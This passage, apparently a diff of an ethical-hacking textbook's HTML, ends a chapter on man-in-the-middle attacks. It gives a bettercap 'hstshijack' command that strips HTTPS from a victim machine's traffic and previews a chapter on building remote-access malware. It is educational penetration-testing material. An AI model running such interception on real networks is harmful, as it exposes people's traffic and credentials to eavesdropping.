+			<p class="figure-caption">Figure 5.21 – Help command</p>
+			<p>Next, to <a id="_idIndexMarker322"/>see <a id="_idIndexMarker323"/>the raw HTTP traffic, run the following command: </p>
+			<p class="source-code">hstshijack/hstshijack</p>
+			<p>This will start stripping the traffic. Now, if you go to the Windows machine and go to a website such as <a href="http://google.com">google.com</a>, you will see that the website connection is unsecure. If you go to <a href="http://google.com">google.com</a>, you will notice a <em class="italic">Not secure</em> tag before the URL. </p>
+			<p>You should now have an unsecure version of Google. If you go to your Kali Linux terminal where <strong class="source-inline">bettercap</strong> is running, you should see the network traffic. </p>
+			<p class="callout-heading">Attention!</p>
+			<p class="callout">Note that big companies such as Google, Facebook, and so on spend huge amounts of money on their security and are constantly trying to improve their protection methods, so one attack that works today might not work tomorrow. That is why penetration testers and cyber security defense teams are constantly involved in a chasing game. The goal of the previous example is to show how these methods<a id="_idIndexMarker324"/> work in practice. By the time you use it for <a id="_idIndexMarker325"/>yourself, things might have changed and this attack method may or may not work. It is important to stay updated. The purpose of this book is not to get you get stuck on using specific tools but to show you the way penetration testers and security analysts think.</p>
+			<h1 id="_idParaDest-122"><a id="_idTextAnchor128"/>Summary</h1>
+			<p>In this chapter, we built on the knowledge we learned about in the previous chapter and used it to build an ARP spoof program, which enabled us to intercept traffic on a local network. Then, we learned how the HTTP and HTTPS protocols work and how they can be broken by man in the middle attacks. </p>
+			<p>In next chapter, we will look at a more exciting topic: malware development. This can help us manually take charge of a victim's machine and perform certain tasks on it. By doing so, we will learn how to build a malware <strong class="bold">Remote Access Tool</strong> to take control of the victim's computer. We will build a program that will enable us to remotely take control of the victim's machine and perform several tasks on it. See you in the next chapter! </p>
+		</div>
+	</body></html>
